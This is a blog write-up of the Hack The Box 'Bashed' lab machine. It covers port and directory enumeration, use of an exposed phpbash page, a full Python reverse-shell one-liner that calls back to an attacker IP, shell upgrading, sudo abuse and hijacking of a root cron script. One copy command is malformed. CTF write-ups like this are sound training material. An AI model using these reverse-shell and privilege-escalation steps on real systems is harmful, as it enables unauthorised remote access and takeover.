---
layout: post
title: HTB - Bashed Writeup
date: 2019-01-05
image: '/images/posts/htb/bashed/bashed.jpg'
categories: ["writeups"]
tags: ["writeups", "bashed", "htb"]
---

* Box: Bashed
  - Difficulty: Easy
  - Points: 20
  - Release: 09 Dec 2017
  - IP: 10.10.10.68

### Initial Enumeration

#### Nmap Scan
Let's start with a scan of the target ip address:

`nmap -sC -A -oN bashed.nmap 10.10.10.68`

* -sC:  Default script
* -A:    Enable OS detection, version detection, script scanning, and traceroute
* -oN:  Output scan in normal format

The result shows only tcp/80 is open.

#### Port 80

Browsing the webpage presents us with a phpbash development page.
After a quick search of the site, there is nothing that stands out as potentially useful.

The next step would be to investigate if there are any hidden files or directories with GoBuster.

#### GoBuster Directory Search

`gobuster dir -u http://10.10.10.68 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php`

Navigate to /dev
<img src="/images/posts/htb/bashed/bashed2.jpg">


#### Get user.txt
A simple `cat` of the home directory of "arrexel" shows the user.txt flag.

<img src="/images/posts/htb/bashed/bashed3.jpg">

### 5. Get Reverse Shell

Run a netcat listener on your attacker box:
`nc -nlvp 4444`

To get a reverse shell, you can use the following python command:

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.28",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  `

Run that and you should get a reverse shell call as such:
<img src="/images/posts/htb/bashed4.jpg">

Checking the `whoami`, we see that we're running as "www-data". Run the below to pop a full shell:

- `python -c 'import pty;pty.spawn("/bin/bash");'`
- Press `Ctrl + Z` (to pause)
- `stty raw -echo`
- `fg` (to un-pause)
- `nc -nvlp 4444`

<img src="/images/posts/htb/bashed/bashed5.jpg">


### Privilege Escalation

#### Misconfigured Sudo Permissions

We check what the current user can run as sudo. We can see www-data can run all commands as scriptmanager without the need for a password.

`sudo -l`

<img src="/images/posts/htb/bashed/bashed6.jpg">

Looking through the directories manually we see a folder named **/scripts** which is owned by **scriptmanager**.
So lets run `sudo -u scriptmanager /bin/bash` to spawn a bash shell and give full read/write access to the **/scripts** folder

#### Cronjobs & test.py script file

The file named **test.py** looks to be executed every minute based on the timestamp of **test.txt**. We can see the text file is owned by root so it is safe to presume that it is run as a root cron job.

Let's just edit the **test.py** or create a new python file in **/scripts** to grab a shell as we know root will execute the contents of **scripts**.

I used one of the various reverse shells listed [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and moved this file into the **/scripts** directory.
`cp /tmp/reverseshell.py > /scripts/test.py`
Set up a listener and wait for a second.
And we got a connection as root.

**Go ahead and cat the root flag under the root directory**

<img src="/images/posts/htb/bashed/bashed7.jpg">

`cat root.txt`
<img src="/images/posts/htb/bashed/bashed8.jpg">
